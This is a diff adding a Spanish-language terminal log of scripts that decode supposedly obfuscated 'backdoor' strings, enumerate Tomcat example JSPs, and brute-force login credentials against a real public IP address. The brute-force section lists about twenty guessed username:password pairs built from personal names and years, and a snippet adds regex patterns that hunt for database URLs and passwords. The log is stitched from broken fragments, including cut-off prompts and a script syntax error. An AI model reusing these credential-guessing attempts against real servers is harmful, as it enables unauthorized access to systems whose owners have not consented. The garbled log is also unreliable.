@@ -1,0 +1,151 @@
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ node deep_backdoor_analysis.js
+=== ANÁLISIS COMPLETO DEL BACKDOOR ===
+Se encontraron 24 cadenas potencialmente ofuscadas
+
+Cadena 0: "abcdefghijklmn�opqrstuvwxyzABCDEFGHIJKLMN�OPQRSTUVWXYZ0123456789"
+Decodificado: "p89x#!oU7=eiyQXu_IMC,N.1zBR-T)qYbrkA<ndhfVjl6[DL?]3H(4ca0Gswg@"
+---
+Cadena 7: "abcdefghijklmn�opqrstuvwxyzABCDEFGHIJKLMN�OPQRSTUVWXYZ0123456789"
+Decodificado: "p89x#!oU7=eiyQXu_IMC,N.1zBR-T)qYbrkA<ndhfVjl6[DL?]3H(4ca0Gswg@"
+---
+Cadena 14: "0.123456789"
+Decodificado: "p89x#!oU7Z="
+---
+Cadena 15: "abcdefghijklmn�opqrstuvwxyzABCDEFGHIJKLMN�OPQRSTUVWXYZ-0123456789"
+Decodificado: "p89x#!oU7=>eiyQXu_IMC,N.1zBR-T)qYbrkA<ndhfVjl6[DL?]3H(4ca0Gswg@"
+---
+Cadena 16: "abcdefghijklmn�opqrstuvwxyzABCDEFGHIJKLMN�OPQRSTUVWXYZ0123456789"
+Decodificado: "p89x#!oU7=eiyQXu_IMC,N.1zBR-T)qYbrkA<ndhfVjl6[DL?]3H(4ca0Gswg@"
+---
+Cadena 18: "0123456789-"
+Decodificado: ">p89x#!oU7="
+---
+Cadena 19: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789@-."
+Decodificado: "Z>2p89x#!oU7=PeiyQXu_IMC,N.1zBR-T)qYbrkA<ndhfVjl6[DL?]3H(4ca0Gswg@"
+---
+Cadena 20: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-~$+=,&.1234567890/:_"
+Decodificado: "PK=p89x#!oU7ZvW>eiyQXu_IMC,N.1zBR-T)qYbrkA<ndhfVjl6[DL?]3H(4ca0Gswg@"
+---
+=== BUSCANDO CONFIGURACIÓN DE BASE DE DATOS ===
+                                                                                
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ 
+
+== BUSCANDO CONFIGURACIÓN EN ARCHIVOS JSP ===
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 16658  100 16658    0     0  42939      0 --:--:-- --:--:-- --:--:-- 43043
+JSPs encontrados:
+examples_jsp_directory.html:href="dates/date.jsp"
+examples_jsp_directory.html:href="forward/forward.jsp"
+examples_jsp_directory.html:href="include/include.jsp"
+examples_jsp_directory.html:href="jsp2/el/basic-arithmetic.jsp"
+examples_jsp_directory.html:href="jsp2/el/basic-comparisons.jsp"
+examples_jsp_directory.html:href="jsp2/jspattribute/jspattribute.jsp"
+examples_jsp_directory.html:href="jsp2/jspattribute/shuffle.jsp"
+examples_jsp_directory.html:href="jsp2/misc/config.jsp"
+examples_jsp_directory.html:href="jsp2/misc/dynamicattrs.jsp"
+examples_jsp_directory.html:href="jsp2/simpletag/book.jsp"
+examples_jsp_directory.html:href="jsp2/simpletag/hello.jsp"
+examples_jsp_directory.html:href="jsp2/simpletag/repeat.jsp"
+examples_jsp_directory.html:href="jsp2/tagfiles/hello.jsp"
+examples_jsp_directory.html:href="jsp2/tagfiles/panel.jsp"
+examples_jsp_directory.html:href="jsp2/tagfiles/products.jsp"
+examples_jsp_directory.html:href="jsptoserv/jsptoservlet.jsp"
+examples_jsp_directory.html:href="num/numguess.jsp"
+examples_jsp_directory.html:href="plugin/plugin.jsp"
+examples_jsp_directory.html:href="simpletag/foo.jsp"
+examples_jsp_directory.html:href="snp/snoop.jsp"
+examples_jsp_directory.html:href="tagplugin/choose.jsp"
+examples_jsp_directory.html:href="tagplugin/foreach.jsp"
+examples_jsp_directory.html:href="tagplugin/if.jsp"
+examples_jsp_directory.html:href="xml/xml.jsp"
+Analizando: examples_jsp_directory.html:dates/date.jsp
+Analizando: examples_jsp_directory.html:forward/forward.jsp
+Analizando: examples_jsp_directory.html:include/include.jsp
+Analizando: examples_jsp_directory.html:jsp2/el/basic-arithmetic.jsp
+Analizando: examples_jsp_directory.html:jsp2/el/basic-comparisons.jsp
+Analizando: examples_jsp_directory.html:jsp2/jspattribute/jspattribute.jsp
+Analizando: examples_jsp_directory.html:jsp2/jspattribute/shuffle.jsp
+Analizando: examples_jsp_directory.html:jsp2/misc/config.jsp
+Analizando: examples_jsp_directory.html:jsp2/misc/dynamicattrs.jsp
+Analizando: examples_jsp_directory.html:jsp2/simpletag/book.jsp
+Analizando: examples_jsp_directory.html:jsp2/simpletag/hello.jsp
+Analizando: examples_jsp_directory.html:jsp2/simpletag/repeat.jsp
+Analizando: examples_jsp_directory.html:jsp2/tagfiles/hello.jsp
+Analizando: examples_jsp_directory.html:jsp2/tagfiles/panel.jsp
+Analizando: examples_jsp_directory.html:jsp2/tagfiles/products.jsp
+Analizando: examples_jsp_directory.html:jsptoserv/jsptoservlet.jsp
+Analizando: examples_jsp_directory.html:num/numguess.jsp
+Analizando: examples_jsp_directory.html:plugin/plugin.jsp
+Analizando: examples_jsp_directory.html:simpletag/foo.jsp
+Analizando: examples_jsp_directory.html:snp/snoop.jsp
+Analizando: examples_jsp_directory.html:tagplugin/choose.jsp
+Analizando: examples_jsp_directory.html:tagplugin/foreach.jsp
+Analizando: examples_jsp_directory.html:tagplugin/if.jsp
+Analizando: examples_jsp_directory.html:xml/xml.jsp
+                                                                                
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ 
+
+=== FUERZA BRUTA BASADA EN BACKDOOR ===
+🔓 REDIRECCIÓN CON jose:tono en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=DA4CE7AEDDB574AEA8E115EFB5A9EFFE
+🔓 REDIRECCIÓN CON tono:garcia en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=019C41A5A42B089E7CBC36AAA8F9E605
+🔓 REDIRECCIÓN CON jose.tono:garcia en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=322A84D1F834D8223CAAF8D8CCFA8D7D
+🔓 REDIRECCIÓN CON danyel:sp en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=30318E8FC34938C5491CDCAB1E06850A
+🔓 REDIRECCIÓN CON dnylsp:spranch en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=419F3FBEEB4CB198E1BFE725E1A4ECAD
+🔓 REDIRECCIÓN CON isct:2010 en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=7CE1C17EDE6E2505CF186A6A44C26395
+🔓 REDIRECCIÓN CON sito:uts en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=C80AC4519284B37D58C986640A7ED168
+🔓 REDIRECCIÓN CON sito:utslp en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=1767088ECE6CE5C30E6EF445E3F5FD9F
+🔓 REDIRECCIÓN CON admin:sito en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=FC029BD8F7034098E1101B06858A9C49
+🔓 REDIRECCIÓN CON jose:ISCT2010 en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=809D400FC24716017E97A2E22900C11F
+🔓 REDIRECCIÓN CON tono:ISCT2010 en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=CCD2978B2C6899BB294BC4C325C99554
+🔓 REDIRECCIÓN CON danyel:Spr@nch2010 en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=D5FE2E5955D9ECDA8304D7341BF921A4
+🔓 REDIRECCIÓN CON dnylsp:SpRanch en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=0F33F92A1F87452BD8B913875F974878
+🔓 REDIRECCIÓN CON admin:Utslp2024 en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=C15E814CF1FE759D70B777366266B2C0
+🔓 REDIRECCIÓN CON sito:Utslp2024 en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=F5D22ECCFAFD8B3FE6F933A02E60285E
+🔓 REDIRECCIÓN CON jose:SITO en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=CC1DA10064573D2C6FB860B293BA72A4
+🔓 REDIRECCIÓN CON tono:SITO en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=87038811F68064855EE3DECB8B0B64A0
+🔓 REDIRECCIÓN CON danyel:SITO en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=38D8E366FC52383590E08ABA5C620A43
+🔓 REDIRECCIÓN CON manager:SITO en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=A8CF4B6C03EC3C8B3B3BCC35E52BEA3A
+🔓 REDIRECCIÓN CON tomcat:SITO en /jsp/menu.jsp -> https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=F65250600B97F8BDC4B30C5E8D601A4B
+                                                                                
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ 
+
+ux/Scrpits]
+└─$ ./yap.sh      
+=== BUSQUEDA DE ARCHIVOS DE CONFIGURACIÓN ===
+./yap.sh: 4: Syntax error: "(" unexpected
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ >....                                                                       
+
+// Buscar en el código patrones de conexión
+const code = fs.readFileSync('utilities.js', 'utf8');
+const connectionPatterns = [
+    /['"](jdbc:[^'"]+)['"]/gi,
+    /['"](mysql:[^'"]+)['"]/gi,
+    /['"](password[^'"]+)['"]/gi,
+    /['"](user[^'"]+)['"]/gi
+];
+
+connectionPatterns.forEach(pattern => {
+    const matches = code.match(pattern);
+    if (matches) {
+        console.log(`\nPatrón encontrado (${pattern}):`);
+        matches.slice(0, 5).forEach(match => console.log("  " + match));
+    }
+});
+EOF
+
+node auto_decode.js
+=== ANÁLISIS AUTOMATIZADO DEL BACKDOOR ===
+=== DECODIFICACIÓN AUTOMÁTICA ===
+")HS(*39YUF?" -> "Equipo SITO"
+"gYhCge*3y3H*Zd3#" -> "Jose Tono Garcia"
+"other_encoded_strings_here" -> "G6GcPla?46jlPsGsLw?GP6GcjL"
